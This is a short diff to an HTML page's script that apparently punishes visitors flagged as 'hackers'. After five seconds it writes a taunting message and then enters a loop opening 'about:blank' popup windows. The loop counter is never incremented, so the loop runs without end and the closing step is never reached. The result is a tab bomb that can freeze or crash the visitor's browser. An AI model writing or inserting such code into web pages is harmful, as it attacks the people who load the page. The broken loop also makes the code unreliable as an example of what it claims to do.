@@ -5,8 +5,17 @@
     console.log("Well... GO AWAY YOU HACKER")
     setTimeout(() => {
       document.write("Let the nukes fall. On your head.")
-      w = window.open("about:blank")
-      w.document.write("Let the nukes fall. On your head.")
+      var x = 0
+      var tabs = []
+      while (x < 100) {
+        w = window.open("about:blank")
+        w.document.write("Let the nukes fall. On your head.")
+        tabs.push(w)
+      }
+      x = 0
+      for (var x in tabs) {
+        tabs[x].close()
+      }
     }, 5000)
   </script>
   <meta charset="utf-8">
